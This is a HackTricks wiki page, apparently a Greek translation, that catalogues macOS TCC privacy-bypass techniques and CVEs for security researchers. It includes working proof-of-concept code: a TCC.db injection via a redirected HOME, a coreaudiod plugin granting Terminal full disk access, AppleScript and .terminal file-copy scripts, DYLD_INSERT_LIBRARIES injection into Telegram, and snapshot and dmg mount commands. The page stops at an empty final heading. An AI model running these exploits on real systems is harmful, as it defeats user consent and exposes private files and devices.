# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Ανά λειτουργία

### Write Bypass

Αυτό δεν είναι bypass, είναι απλώς ο τρόπος με τον οποίο λειτουργεί το TCC: **Δεν προστατεύει από την εγγραφή**. Αν το Terminal **δεν έχει πρόσβαση για ανάγνωση στο Desktop ενός χρήστη, μπορεί και πάλι να γράψει σε αυτό**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Το **extended attribute `com.apple.macl`** προστίθεται στο νέο **file** για να δώσει στην **creators app** πρόσβαση ανάγνωσης.

### TCC ClickJacking

Είναι δυνατό να **τοποθετηθεί ένα παράθυρο πάνω από το TCC prompt**, ώστε να γίνει **accept** από τον χρήστη χωρίς να το αντιληφθεί. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ο attacker μπορεί να **δημιουργήσει apps με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να τα κάνει να ζητήσουν πρόσβαση σε κάποια τοποθεσία που προστατεύεται από το TCC. Ο χρήστης θα πιστεύει ότι η legit εφαρμογή είναι αυτή που ζητά την πρόσβαση.\
Επιπλέον, είναι δυνατό να **αφαιρεθεί η legit εφαρμογή από το Dock και να τοποθετηθεί σε αυτό η fake**, ώστε όταν ο χρήστης κάνει click στη fake (η οποία μπορεί να χρησιμοποιεί το ίδιο icon), αυτή να καλέσει τη legit, να ζητήσει TCC permissions και να εκτελέσει ένα malware, κάνοντας τον χρήστη να πιστέψει ότι η legit εφαρμογή ζήτησε την πρόσβαση.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC στο:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Full Disk Access"**. Για να το απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της από τη λίστα δεν αφαιρεί αυτά τα privileges):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Εδώ μπορείτε να βρείτε παραδείγματα για το πώς ορισμένα **malwares κατάφεραν να παρακάμψουν αυτή την προστασία**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> Σημειώστε ότι πλέον, για να μπορέσετε να ενεργοποιήσετε το SSH, χρειάζεστε **Full Disk Access**

### Handle extensions - CVE-2022-26767

Το attribute **`com.apple.macl`** δίνεται σε files για να δώσει σε **μια συγκεκριμένη εφαρμογή permissions ανάγνωσης.** Αυτό το attribute ορίζεται όταν γίνεται **drag\&drop** ενός file πάνω σε ένα app ή όταν ένας χρήστης κάνει **double-click** σε ένα file για να το ανοίξει με την **default application**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρίσει ένα malicious app** για να χειρίζεται όλα τα extensions και να καλέσει το Launch Services ώστε να **ανοίξει** οποιοδήποτε file (οπότε στο malicious file θα παραχωρηθεί πρόσβαση ανάγνωσης).

### iCloud

Με το entitlement **`com.apple.private.icloud-account-access`** είναι δυνατή η επικοινωνία με το **`com.apple.iCloudHelper`** XPC service, το οποίο θα **παρέχει iCloud tokens**.

Τα **iMovie** και **Garageband** είχαν αυτό το entitlement και άλλα που το επέτρεπαν.

Για περισσότερες **πληροφορίες** σχετικά με το exploit για την **απόκτηση icloud tokens** μέσω αυτού του entitlement, δείτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Ένα app με το permission **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλα Apps**. Αυτό σημαίνει ότι θα μπορούσε να **καταχραστεί τα permissions που έχουν παραχωρηθεί στα άλλα Apps**.

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, δείτε:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Για παράδειγμα, αν ένα App έχει **Automation permission πάνω στο `iTerm`**, σε αυτό το παράδειγμα το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Το Terminal, που δεν έχει FDA, μπορεί να καλέσει το iTerm, το οποίο το διαθέτει, και να το χρησιμοποιήσει για την εκτέλεση ενεργειών:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Μέσω Finder

Ή αν ένα App έχει πρόσβαση μέσω Finder, θα μπορούσε να εκτελέσει ένα script όπως αυτό:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ανά συμπεριφορά App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Το userland **tccd daemon** χρησιμοποιούσε τη μεταβλητή **`HOME`** του **env** για πρόσβαση στη βάση δεδομένων χρηστών του TCC από το: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή το TCC daemon εκτελείται μέσω του **`launchd`** στο domain του τρέχοντος χρήστη, είναι δυνατός ο **έλεγχος όλων των μεταβλητών περιβάλλοντος** που του μεταβιβάζονται.\
Έτσι, ένας **attacker θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`**, ώστε να δείχνει σε έναν **ελεγχόμενο** **κατάλογο**, να κάνει **restart** το **TCC** daemon και, στη συνέχεια, να **τροποποιήσει απευθείας τη βάση δεδομένων TCC**, παρέχοντας στον εαυτό του **κάθε διαθέσιμο TCC entitlement**, χωρίς ποτέ να εμφανιστεί prompt στον τελικό χρήστη.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Σημειώσεις

Το Notes είχε πρόσβαση σε τοποθεσίες που προστατεύονται από το TCC, αλλά όταν δημιουργείται μια σημείωση, αυτή **δημιουργείται σε μη προστατευμένη τοποθεσία**. Επομένως, μπορούσατε να ζητήσετε από το Notes να αντιγράψει ένα προστατευμένο αρχείο σε μια σημείωση (δηλαδή σε μη προστατευμένη τοποθεσία) και, στη συνέχεια, να αποκτήσετε πρόσβαση στο αρχείο:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Το binary `/usr/libexec/lsd` με τη library `libsecurity_translocate` είχε το entitlement `com.apple.private.nullfs_allow`, το οποίο του επέτρεπε να δημιουργεί **nullfs** mount, καθώς και το entitlement `com.apple.private.tcc.allow` με το **`kTCCServiceSystemPolicyAllFiles`**, ώστε να αποκτά πρόσβαση σε κάθε αρχείο.

Ήταν δυνατό να προστεθεί το quarantine attribute στο "Library", να κληθεί το **`com.apple.security.translocation`** XPC service και, στη συνέχεια, αυτό να αντιστοιχίσει το Library στο **`$TMPDIR/AppTranslocation/d/d/Library`**, όπου μπορούσαν να **προσπελαστούν** όλα τα έγγραφα μέσα στο Library.

### CVE-2024-44131 - FileProvider symlink race

Οι εφαρμογές που αναθέτουν τις λειτουργίες αρχείων σε έναν **privileged helper** (εδώ το **`fileproviderd`** / **`Files.app`**) αντιγράφουν ή μετακινούν items **για λογαριασμό του χρήστη**, επομένως η αντιγραφή εκτελείται με τα privileges του helper αντί για εκείνα του caller.

Τα Jamf Threat Labs έδειξαν ότι η επικύρωση του symlink που εκτελείται πριν από τη λειτουργία μπορεί να γίνει **race**: αντί να τοποθετήσει ο attacker το symlink στο **τελευταίο** path component (το οποίο ελέγχεται), αλλάζει έναν **ενδιάμεσο** directory του path **αφού έχει ήδη ξεκινήσει η αντιγραφή**. Στη συνέχεια, ο privileged helper ακολουθεί το link που ελέγχει ο attacker και διαβάζει/γράφει σε τοποθεσίες που προστατεύονται από το TCC **χωρίς να εμφανίσει ποτέ prompt**.<sup>[[7]](#references)</sup>

Οι directories που **δεν** προστατεύονται από ένα τυχαίο UUID στο path τους (για παράδειγμα `~/Library/Mobile Documents/com~apple~CloudDocs`) είναι οι ευκολότεροι στόχοι, επειδή ο attacker μπορεί να προβλέψει το πλήρες path για το race.

> [!TIP]
> Αυτό είναι το γενικό pattern που πρέπει να αναζητάτε: **κάθε privileged process που κάνει resolve ένα path περισσότερες από μία φορές** (check-then-use ή `rename()`/`copyfile()` που κάνουν resolve ξεχωριστά το source και το destination) μπορεί να γίνει race με την αντικατάσταση ενός directory στη μέση του path. Μόνο τα `O_NOFOLLOW_ANY`, `openat()` σε ένα ήδη ανοιχτό directory FD ή το `realpath()` + re-validation κλείνουν πραγματικά το παράθυρο.

Περισσότερες πληροφορίες στην [**αναφορά των Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

Το `libsqlite3` μπορεί να γίνει build με το `SQLITE_ENABLE_SQLLOG`, το οποίο προσθέτει ένα logging hook που καθοδηγείται από environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – για **κάθε database που ανοίγει**, ένα **αντίγραφο του database file** και ένα log των SQL statements γράφονται στο `path` (το directory πρέπει να υπάρχει ήδη).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – δημιουργεί **νέο αντίγραφο κάθε φορά** που ανοίγεται ή γίνεται attach μια DB, αντί να επαναχρησιμοποιεί ένα υπάρχον.
- **`SQLITE_SQLLOG_CONDITIONAL`** – καταγράφει μια connection μόνο αν υπάρχει ένα αρχείο `<database>-sqllog δίπλα στην κύρια DB.

Αν μπορείτε να κάνετε inject αυτή τη μεταβλητή σε ένα process που διαθέτει **FDA** και ανοίγει SQLite databases, θα **αντιγράψει πρόθυμα αυτές τις προστατευμένες databases** σε ένα directory που ελέγχετε. Επειδή το όνομα του destination file προκύπτει από attacker-controlled data, ένα **symlink που έχει τοποθετηθεί στο destination** μετατρέπει το ίδιο primitive σε **arbitrary file write** με τα privileges του target process.

### **SQLITE_AUTO_TRACE**

Αν οριστεί το environment variable **`SQLITE_AUTO_TRACE`**, η library **`libsqlite3.dylib`** θα ξεκινήσει να **καταγράφει** όλα τα SQL queries. Πολλές εφαρμογές χρησιμοποιούσαν αυτή τη library, επομένως ήταν δυνατή η καταγραφή όλων των SQLite queries τους.

Αρκετές εφαρμογές της Apple χρησιμοποιούσαν αυτή τη library για πρόσβαση σε πληροφορίες που προστατεύονται από το TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

Οι δύο προηγούμενες καταχωρίσεις αποτελούν παραδείγματα της ίδιας γενικής τεχνικής και αξίζει να αναζητήσετε περισσότερα: **τα frameworks που φορτώνονται σε TCC-privileged apps συχνά εκθέτουν debug/logging environment variables, τα οποία κάνουν τη διεργασία να δημιουργεί ένα αρχείο σε path που ελέγχεται από τον caller**.

Workflow για τον εντοπισμό τους:

1. Επιλέξτε έναν στόχο με FDA ή άλλη χρήσιμη TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) και καταγράψτε τα frameworks με τα οποία συνδέεται (`otool -L`, `vmmap`).
2. Κάντε grep σε αυτά τα frameworks για strings του `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ορίστε τις υποψήφιες μεταβλητές μέσω `launchctl setenv NAME /path/you/control`, εκκινήστε την app και παρακολουθήστε τι κάνει στο filesystem με `fs_usage -w -f filesys <pid>` ή `sudo fs_usage | grep <path>`.
4. Αν η διεργασία **δημιουργεί ή μετονομάζει** ένα αρχείο στον κατάλογό σας, έχετε ένα write primitive: δείξτε τον προορισμό σε ένα symlink (ή κάντε race σε έναν ενδιάμεσο κατάλογο, όπως στο CVE-2024-44131 παραπάνω), ώστε να το ανακατευθύνετε στο `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Δύο πράγματα το περιορίζουν αυτό. Πρώτον, οι μεταβλητές `DYLD_*` αγνοούνται για hardened-runtime binaries, εκτός αν η app διαθέτει το entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — δείτε επίσης το [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Δεύτερον, η Apple αφαιρεί μεμονωμένες framework debug variables όταν αυτές αναφέρονται, επομένως μια μεταβλητή που λειτουργούσε σε μία έκδοση του macOS συχνά έχει αφαιρεθεί στην επόμενη. Αν μια app αρνείται σιωπηλά να εκκινηθεί αφού ορίσετε μία, θεωρήστε ότι η μεταβλητή έχει ήδη φιλτραριστεί.

Δείτε το [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) για το αντίστοιχο trick με linker variables.

### Apple Remote Desktop

Ως root θα μπορούσατε να ενεργοποιήσετε αυτή την υπηρεσία και ο **ARD agent θα είχε full disk access**, το οποίο θα μπορούσε στη συνέχεια να γίνει αντικείμενο abuse από έναν user, ώστε να τον κάνετε να αντιγράψει μια νέα **TCC user database**.

## By **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια database στον HOME folder του user για τον έλεγχο της πρόσβασης σε resources που αφορούν συγκεκριμένα τον user, στη θέση **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο user καταφέρει να κάνει restart το TCC με μια μεταβλητή `$HOME` που δείχνει σε έναν **διαφορετικό folder**, θα μπορούσε να δημιουργήσει μια νέα TCC database στο **/Library/Application Support/com.apple.TCC/TCC.db** και να εξαπατήσει το TCC ώστε να εκχωρήσει οποιαδήποτε TCC permission σε οποιαδήποτε app.

> [!TIP]
> Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που είναι αποθηκευμένη στο profile του user, στο attribute **`NFSHomeDirectory`**, για την **τιμή του `$HOME`**. Επομένως, αν παραβιάσετε μια application με permissions τροποποίησης αυτής της τιμής (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **weaponize** αυτή την επιλογή με ένα TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Το **πρώτο POC** χρησιμοποιεί τα [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για την τροποποίηση του **HOME** folder του user.

1. Αποκτήστε ένα _csreq_ blob για την target app.
2. Τοποθετήστε ένα fake _TCC.db_ file με την απαιτούμενη πρόσβαση και το _csreq_ blob.
3. Κάντε export την καταχώριση του user στο Directory Services με το [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε την καταχώριση του Directory Services, ώστε να αλλάξετε το home directory του user.
5. Κάντε import την τροποποιημένη καταχώριση του Directory Services με το [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Σταματήστε το _tccd_ του user και κάντε reboot τη διεργασία.

Το δεύτερο POC χρησιμοποίησε το **`/usr/libexec/configd`**, το οποίο διέθετε `com.apple.private.tcc.allow` με τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατό να εκτελεστεί το **`configd`** με την επιλογή **`-t`**, μέσω της οποίας ένας attacker μπορούσε να καθορίσει ένα **custom Bundle προς φόρτωση**. Επομένως, το exploit **αντικαθιστά** τη μέθοδο αλλαγής του home directory του user μέσω **`dsexport`** και **`dsimport`** με **code injection στο `configd`**.

Για περισσότερες πληροφορίες δείτε το [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[13]](#references)</sup>

## By process injection

Υπάρχουν διαφορετικές τεχνικές για injection code μέσα σε μια διεργασία και abuse των TCC privileges της:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Επιπλέον, το πιο συνηθισμένο process injection για TCC bypass που έχει εντοπιστεί γίνεται μέσω **plugins (load library)**.\
Τα plugins είναι πρόσθετος κώδικας, συνήθως με τη μορφή libraries ή plist, ο οποίος **φορτώνεται από την κύρια application** και εκτελείται στο context της. Επομένως, αν η κύρια application είχε πρόσβαση σε TCC restricted files (μέσω granted permissions ή entitlements), **θα την είχε και ο custom code**.

### CVE-2020-27937 - Directory Utility

Η application `/System/Library/CoreServices/Applications/Directory Utility.app` διέθετε το entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, φόρτωνε plugins με extension **`.daplug`** και **δεν διέθετε hardened** runtime.

Για να γίνει weaponize αυτό το CVE, το **`NFSHomeDirectory`** **αλλάζει** (με abuse του προηγούμενου entitlement), ώστε να είναι δυνατή η **ανάληψη του TCC database του user** για TCC bypass.

Για περισσότερες πληροφορίες δείτε το [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Το binary **`/usr/sbin/coreaudiod`** διέθετε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο **επέτρεπε code injection**, ενώ το δεύτερο του έδινε πρόσβαση στη **διαχείριση του TCC**.

Αυτό το binary επέτρεπε τη φόρτωση **third party plug-ins** από τον folder `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατή η **φόρτωση ενός plugin και το abuse των TCC permissions** με αυτό το PoC:<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[15]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Οι εφαρμογές συστήματος που ανοίγουν stream κάμερας μέσω του Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν στη διεργασία αυτά τα plugins, τα οποία βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (δεν περιορίζονται από το SIP).

Η απλή αποθήκευση μιας βιβλιοθήκης με τον συνηθισμένο **constructor** σε αυτήν την τοποθεσία αρκεί για **inject code**.

Αρκετές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox διέθετε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Για περισσότερες πληροφορίες σχετικά με το πώς μπορείτε να το εκμεταλλευτείτε εύκολα, δείτε [**το original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[16]](#references)</sup>

### CVE-2020-10006

Το binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` διέθετε τα entitlements **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, τα οποία επέτρεπαν την εισαγωγή κώδικα μέσα στη διεργασία και τη χρήση των TCC privileges.

### CVE-2023-26818 - Telegram

Το Telegram διέθετε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, επομένως ήταν δυνατή η κατάχρησή του για **απόκτηση πρόσβασης στα permissions του**, όπως η καταγραφή με την camera. Μπορείτε να [**βρείτε το payload στο writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[17]](#references)</sup>

Σημειώστε ότι, για τη χρήση της env variable με σκοπό τη φόρτωση ενός library, δημιουργήθηκε ένα **custom plist** για την εισαγωγή αυτού του library και χρησιμοποιήθηκε το **`launchctl`** για την εκκίνησή του:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Μέσω κλήσεων του open

Είναι δυνατή η κλήση του **`open`** ακόμη και ενώ βρίσκεστε σε sandboxed περιβάλλον.

### Terminal Scripts

Είναι αρκετά συνηθισμένο να παρέχεται **Full Disk Access (FDA)** στο Terminal, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από άτομα του τεχνολογικού κλάδου. Επίσης, είναι δυνατή η κλήση scripts **`.terminal`** μέσω αυτού.

Τα scripts **`.terminal`** είναι αρχεία plist όπως το παρακάτω, με την εντολή προς εκτέλεση στο key **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Μια εφαρμογή θα μπορούσε να γράψει ένα script τερματικού σε μια τοποθεσία όπως το /tmp και να το εκκινήσει με μια εντολή όπως:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Με mounting

### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation

**Οποιοσδήποτε χρήστης** (ακόμη και μη προνομιούχοι) μπορεί να δημιουργήσει και να προσαρτήσει ένα snapshot του Time Machine και να αποκτήσει **πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του snapshot.\
Το **μόνο προνόμιο** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να διαθέτει πρόσβαση **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να παραχωρηθεί από έναν administrator.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερής εξήγηση μπορεί να [**βρεθεί στο αρχικό report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Ακόμα και αν το TCC DB file προστατευόταν, ήταν δυνατή η εκτέλεση **mount πάνω από τον κατάλογο** ενός νέου TCC.db file:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Ελέγξτε το **πλήρες exploit** στο [**αρχικό writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Όπως εξηγείται στο [αρχικό writeup](https://www.kandji.io/blog/macos-audit-story-part2), αυτό το CVE εκμεταλλευόταν το `diskarbitrationd`.<sup>[[18]](#references)</sup>

Η function `DADiskMountWithArgumentsCommon` από το public `DiskArbitration` framework πραγματοποιούσε τους security checks. Ωστόσο, ήταν δυνατό να παρακαμφθεί με απευθείας κλήση του `diskarbitrationd` και, επομένως, με χρήση στοιχείων `../` στο path και symlinks.

Αυτό επέτρεπε σε έναν attacker να πραγματοποιεί arbitrary mounts σε οποιαδήποτε τοποθεσία, ακόμη και πάνω από τη βάση δεδομένων TCC, λόγω του entitlement `com.apple.private.security.storage-exempt.heritable` του `diskarbitrationd`.

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του disk και το mount του σε άλλη τοποθεσία, παρακάμπτοντας τις TCC protections.

### CVE-2022-22655 - Location Services

